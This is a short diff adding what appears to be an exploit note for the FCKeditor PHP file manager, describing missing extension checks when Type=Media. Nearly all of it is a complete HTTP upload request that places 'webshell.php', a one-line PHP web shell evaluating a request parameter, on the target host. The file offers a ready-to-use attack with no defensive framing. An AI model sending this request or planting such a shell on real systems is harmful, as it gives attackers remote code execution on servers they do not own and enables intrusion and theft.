@@ -1,0 +1,22 @@
+# fckeditor
+
+# no extension verification when Type=Media
+
+POST /Admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1
+Host: www.foo.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.foo.com/Admin/fckeditor/editor/filemanager/upload/php/
+Cookie: PHPSESSID=m3pjuop2vmd6u9tblj70a346v0
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=--------692044082
+Content-Length: 151
+
+----------692044082
+Content-Disposition: form-data; name="NewFile"; filename="webshell.php"
+
+<?php eval($_REQUEST["c"]);
+
+----------692044082--
